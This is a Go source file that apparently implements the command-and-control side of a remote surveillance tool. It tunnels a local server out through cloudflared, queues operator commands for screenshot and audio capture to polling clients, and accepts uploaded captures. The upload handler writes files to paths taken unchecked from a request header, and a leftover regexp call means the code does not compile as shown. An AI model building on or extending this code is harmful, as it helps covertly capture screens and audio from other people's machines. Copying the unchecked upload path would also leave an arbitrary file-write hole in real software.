package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"runtime"
	"sync"
	"time"
	"os/exec"
	"context"
//	"regexp"
)

// Global commands so user input can be handeled

var mutex sync.Mutex
var userInput string = ""


func ensureCloudflared() string {
	// Name the binary appropriately for Windows vs Linux
	binName := "cloudflared"
	if runtime.GOOS == "windows" {
		binName = "cloudflared.exe"
	}

	// If it doesn't exist locally, download it automatically
	if _, err := os.Stat(binName); os.IsNotExist(err) {
		fmt.Printf("Downloading cloudflared for %s/%s...\n", runtime.GOOS, runtime.GOARCH)

		// Map Go runtime architecture names to Cloudflare's release asset names
		arch := runtime.GOARCH
		if arch == "amd64" {
			arch = "amd64"
		} else if arch == "386" {
			arch = "386"
		} else if arch == "arm64" {
			arch = "arm64"
		}

		url := fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-%s-%s", runtime.GOOS, arch)
		if runtime.GOOS == "windows" {
			url += ".exe"
		}

		resp, err := http.Get(url)
		if err != nil {
			panic(fmt.Sprintf("Failed to download cloudflared: %v", err))
		}
		defer resp.Body.Close()

		out, err := os.Create(binName)
		if err != nil {
			panic(fmt.Sprintf("Failed to create binary file: %v", err))
		}
		defer out.Close()

		_, err = io.Copy(out, resp.Body)
		if err != nil {
			panic(fmt.Sprintf("Failed to save binary: %v", err))
		}

		// Make executable on Linux/Unix
		if runtime.GOOS != "windows" {
			os.Chmod(binName, 0755)
		}
		fmt.Println("Cloudflared downloaded successfully.")
	}

	return binName
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	// 1. Get the custom instruction from the HTTP header
	mediaType := r.Header.Get("X-Media-Type")
	fileName := r.Header.Get("X-File-Name")
	fmt.Printf("Receiving a %s file named: %s...\n", mediaType, fileName)

	// 2. Create the blank local file on disk
	dst, err := os.Create(fileName)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// 3. Stream the bytes directly from the network connection to the disk.
	_, err = io.Copy(dst, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Fprint(w, "File received successfully!")
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	mutex.Lock()
	/*if userInput == "" || userInput == "idle" {
		fmt.Fprint(w, "idle")
	}
	if userInput == "ss" {
		fmt.Fprint(w, "screenshot")
		userInput = ""
		fmt.Println("sending screenshot command")
	}
	if userInput == "sound" {
		fmt.Fprint(w, "audio")
		userInput = ""
		fmt.Println("sending audio command")
	}
	*/
	command := strings.Fields(userInput)
	if len(command) == 0 {
		fmt.Fprint(w, "idle")
		mutex.Unlock()
		return
	}

	switch command[0] {
	case "idle":
		fmt.Fprint(w, userInput)

	case "ss":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
		}

		fmt.Fprint(w, userInput)
		userInput = ""
		fmt.Println("sending screenshot command")

	case "sound":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
			fmt.Println("Hint try sound ./(yourpath)")
			userInput = "idle"
			break
		} else {
			fmt.Fprint(w, userInput)
			command = nil
			fmt.Println("sending audio command")
		}

	default:
		fmt.Fprint(w, "idle")
	}

	defer mutex.Unlock()
}

func useRegex(s string) bool {
	re := regexp.MustCompile("https://[a-z0-9-]+[.]trycloudflare[.]com")
	return re.MatchString(s)
}

func reveiveInput() {
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		mutex.Lock()
		userInput = scanner.Text()
		mutex.Unlock()
		fmt.Println("Queued command:", userInput)
	}

	// Check for errors
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}

func main() {
	// 1. Ensure the binary is present locally without needing a package manager
	binPath := ensureCloudflared()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 2. Start cloudflared targeting your local server port
	cmd := exec.CommandContext(ctx, "./"+binPath, "tunnel", "--protocol", "http2", "--url", "http://localhost:10000")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	
	
	if err := cmd.Start(); err != nil {
		fmt.Printf("Failed to start cloudflared: %v\n", err)
		return
	}
	

	time.Sleep(2 * time.Second)
	fmt.Println("Tunnel is active. Press Ctrl+C to exit.")

	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/get-command", commandHandler)

	go reveiveInput()
	fmt.Println("Receiver running on port 10000. Waiting for media...")
	panic(http.ListenAndServe(":10000", nil))

}
